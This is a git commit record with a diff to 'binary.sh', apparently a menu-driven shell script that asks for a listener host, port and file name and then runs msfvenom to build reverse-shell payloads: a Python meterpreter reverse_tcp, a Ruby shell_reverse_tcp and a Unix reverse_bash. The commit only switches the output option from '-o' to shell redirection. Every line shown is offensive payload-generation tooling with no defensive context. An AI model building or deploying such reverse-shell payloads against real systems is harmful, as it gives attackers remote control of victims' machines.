ab582163eec1133c5b72dec1068f4805720d5fd8
sh1ark <48487918+sh1ark@users.noreply.github.com>
2019-03-14 18:49:03 +0100

    Update binary.sh

--- binary.sh
+++ binary.sh
@@ -3,19 +3,19 @@ if [ "$evil" -eq "01" ];then
 read -p '[+] LHOST : ' lhost
 read -p '[+] LPORT : ' lport
 read -p '[+] NAME  : ' name
-msfvenom python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name
+msfvenom python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport >$name
 fi
 if [ "$evil" -eq "02" ];then
 read -p '[+] LHOST : ' lhost
 read -p '[+] LPORT : ' lport
 read -p '[+] NAME  : ' name
-msfvenom ruby/shell_reverse_tcp LHOST=$lhost LPORT=$lport -o $name
+msfvenom ruby/shell_reverse_tcp LHOST=$lhost LPORT=$lport >$name
 fi
 if [ "$evil" -eq "03" ];then
 read -p '[+] LHOST : ' lhost
 read -p '[+] LPORT : ' lport
 read -p '[+] NAME  : ' name
-msfvenom cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -o $name
+msfvenom cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport >$name
 fi
 if [ "$evil" -eq "00" ];then
 clear
